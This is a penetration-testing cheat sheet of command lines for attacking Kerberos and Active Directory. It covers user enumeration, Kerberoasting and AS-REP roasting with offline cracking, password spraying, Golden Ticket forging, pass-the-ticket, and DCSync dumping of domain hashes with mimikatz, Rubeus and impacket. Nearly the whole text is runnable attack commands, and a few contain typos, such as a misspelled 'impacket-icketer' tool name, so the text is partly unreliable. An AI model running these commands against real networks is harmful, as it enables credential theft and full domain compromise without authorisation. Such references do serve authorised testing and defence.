#  Kerberos / Active Directory Authentication — TCP/UDP 88

Kerberos is the default authentication protocol in Active Directory environments. From a pentest perspective, Kerberos misconfigurations can allow **offline password cracking** via **AS-REP Roasting** and **Kerberoasting**, as well as **credential reuse and ticket abuse** once valid credentials are obtained.

## Detection
### nmap
```
nmap -p 88 -sV <IP>
```

## Banner Grabbing
```
nc -vn target.com 88
```

## Connect

### kinit

#### Request Ticket Granting Ticket
```
kinit username@DOMAIN.LOCAL
```

#### With Password
```
echo 'password' | kinit username@DOMAIN.COM
printf '%s' 'password' | kinit username@DOMAIN.COM
```
#### Check Tickets
```
klist
```

## Username Enumeration 

### kerbrute
```
kerbrute userenum --dc <DC_IP> -d DOMAIN.LOCAL users.txt
```

### nmap
```
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.COM',userdb=users.txt target.com
```

### Manual User Enumeration
```
for user in $(cat users.txt); do
  getTGT.py DOMAIN/$user -dc-ip target.com -no-pass 2>&1 | grep -v "KDC_ERR_PREAUTH_REQUIRED"
done

for user in $(cat users.txt); do
  out=$(impacket-getTGT DOMAIN/$user -dc-ip <DC_IP> -no-pass 2>&1)
  echo "$out" | grep -q "KDC_ERR_C_PRINCIPAL_UNKNOWN" && continue
  echo "[+] Possible valid user: $user"
done
```

## Kerberoasting

- Kerberoasting exploits service accounts with SPNs by requesting tickets that can be cracked offline.

### Request Service Tickets (SPNs)

- Service Principal Names (SPNs) identify services running under specific accounts and are prime targets for Kerberoasting attacks.

#### Impacket
```
impacket-GetUserSPNs DOMAIN/username:password -dc-ip <DC_IP>
impacket-GetUserSPNs DOMAIN/username -hashes :NTLM_HASH -dc-ip <DC_IP>
impacket-GetUserSPNs DOMAIN/username:password -dc-ip target.com -request -outputfile hashes.txt
```

#### Enumerate SPNs via LDAP with credentials (alternative)
```
ldapsearch -x -H ldap://<DC_IP> -D "user@domain.local" -w password \
  -b "DC=example,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
```

### Crack Kerberos Tickets (TGS)

#### Using Hashcat (Kerberos 5 TGS-REP etype 23)
```
hashcat -m 13100 hashes.txt rockyou.txt
```
#### John the Ripper
```
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt
```
#### From Windows with Rubeus
```
Rubeus.exe kerberoast /outfile:hashes.txt
```

### AS-REP Roasting (No Pre-Authentication)

- Users with `DONT_REQ_PREAUTH` set -> AS-REP roastable users

#### Impacket
```
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip target.com -format hashcat
impacket-GetNPUsers DOMAIN/ -dc-ip <DC_IP> -usersfile users.txt
```

#### ldapsearch (also in LDAP.md)
```
ldapsearch -x -H ldap://<DC_IP> -b "DC=example,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

#### Crack AS-REP hashes
```
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

## Password Spraying

### kerbrute
```
kerbrute passwordspray --dc target.com -d DOMAIN.COM users.txt 'Password123!'
```

### crackmapexec
```
crackmapexec smb target.com -u users.txt -p 'Password123!' --continue-on-success
```

### Multiple Passwords
```
for pass in 'Winter2024!' 'Spring2024!' 'Password123!'; do
  kerbrute passwordspray --dc target.com -d DOMAIN.COM users.txt "$pass"
done
```


## Golden Ticket Attack

- Create forged TGT with stolen krbtgt hash to gain domain admin access.

### Mimikatz
```
kerberos::golden /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:KRBTGT_HASH /id:500
```

### Impacket
```
impacket-icketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX-XXX-XXX -domain DOMAIN.COM Administrator
```

### Using Golden Tickets
#### Set ticket
```
export KRB5CCNAME=Administrator.ccache
```
#### Access Any Resource
```
impacket-psexec.py DOMAIN/Administrator@target.com -k -no-pass
```


## Pass-the-Ticket

- Use stolen Kerberos tickets to authenticate without knowning passwords

### Ticket Extraction and Conversion

#### Export ticket from Windows
```
mimikatz "sekurlsa::tickets /export"
```

#### Convert .kirbi to .ccache
```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

#### Use Stolen Ticket
```
export KRB5CCNAME=ticket.ccache
impacket-psexec DOMAIN/username@target.com -k -no-pass
```

## Post-Exploitation

### Ticket Extraction

#### Windows

##### Mimikatz
```
sekurlsa::tickets /export
```
#### Rubues
```
Rubeus.exe dump /service:krbtgt
```

#### Linux 
```
impacket-getTGT DOMAIN/username:password
```

### DCSync Attack
- Extract password hashes from Domain Controller using DCSync technique.
#### Mimikatz
```
lsadump::dcsync /user:DOMAIN\krbtgt
lsadump::dcsync /user:DOMAIN\Administrator
```

#### Impacket
```
impacket-secretsdump DOMAIN/username:password@dc.domain.com
secretsdump.py -just-dc DOMAIN/username:password@dc.domain.com
```